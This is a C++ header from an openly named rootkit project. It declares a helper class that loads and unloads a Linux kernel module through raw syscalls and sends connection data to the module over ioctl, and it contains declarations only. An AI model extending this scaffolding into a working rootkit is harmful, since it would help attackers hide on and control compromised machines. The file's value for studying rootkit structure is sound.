#ifndef ROOTKIT_KERNEL_MODULE_HELPER_H
#define ROOTKIT_KERNEL_MODULE_HELPER_H

#include <optional>
#include <string>
#include "common.h"

# define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)
# define delete_module(mod, flags) syscall(__NR_delete_module, mod, flags)

namespace rootkit {

class KernelModuleHelper {
private:
    std::string module_path;
    std::string module_name;
    std::string module_dev_name;

    std::string loading_error;
    std::optional<conn_info> data;

public:
    /**
     * @brief Load a kernel module
     * @param kernel_module_path Path to the kernel module
     * @param kernel_module_name Kernel module name
     */
    KernelModuleHelper(const std::string& module_path,
                        const std::string& module_name,
                        const std::string& module_dev_name
    );

    /**
     * @brief Unload a kernel module
    */
    ~KernelModuleHelper();

    /**
     * @brief Returns kernel module status
     * @return Returns nullopt if module was loaded correctly, and error message otherwise
     */
    std::optional<std::string> status() const;

    /**
     * @brief Sets internal data for the module, this also sends them to the module via ioctl
     * @return Returns true if data was sent correctly to module, false otherwise
     */
    bool setData(const conn_info& data);

    /**
     * @brief Get current data that are loaded in module, nullopt if no data was loaded in
     */
    std::optional<conn_info> getData() const;
};

}

#endif
